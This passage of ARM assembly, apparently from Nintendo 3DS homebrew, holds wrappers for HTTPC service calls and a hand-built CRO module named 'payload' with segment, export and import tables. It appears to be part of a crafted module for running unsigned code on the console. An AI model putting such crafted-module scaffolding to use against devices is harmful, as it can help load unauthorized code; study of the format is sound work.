    svc 0x32
    pop {r5}
    cmp r0, #0
    blt _HTTPC_GetResponseStatusCode_return
    sub r4, r4, #4
    ldmia r4!, {r0,r1} // result code
    str r1, [r5] // status code
_HTTPC_GetResponseStatusCode_return:
    pop {r4,r5,pc}
.pool

.align 1
.thumb
HTTPC_Finalize: // service_handle_ptr
    push {r4,lr}
    mov r1, r0
    blx _get_command_buffer
    mov r4, r0
    ldr r2, =0x390000
    str r2, [r0] // header code
    ldr r0, [r1] // service handle
    svc 0x32
    cmp r0, #0
    blt _HTTPC_Finalize_return
    ldr r0, [r4,#4] // result code
_HTTPC_Finalize_return:
    pop {r4,pc}
.pool

_cro_text_end:

.align 12, 0
_cro_rodata_start:
_cro_rodata_end:

.align 12, 0
_cro_module_name:
    .asciz "payload"
_cro_segment_table:
    .word _cro_text_start, _cro_text_end-_cro_text_start, 0
    .word _cro_rodata_start, _cro_rodata_end-_cro_rodata_start, 1
    .word _cro_data_start, _cro_data_end-_cro_data_start, 2
    .word 0, 0, 0
    .word 0, 0, 0
_cro_named_export_table:
    .word _cro_export_strings, 0
_cro_export_tree:
    .word 0x1ffff, 0
    .word 0x80000000, 0x8001
_cro_indexed_export_table:
_cro_export_strings:
    .asciz "nnroControlObject_"
_cro_import_module_table:
_cro_import_patches:
_cro_named_import_table:
_cro_indexed_import_table:
_cro_anon_import_table:
_cro_import_strings:
_cro_unknown1:
_cro_relocation_patches:
_cro_unknown2:
_cro_data_start:
_cro_data_end:

.align 12, 0xcc
_cro_file_end:

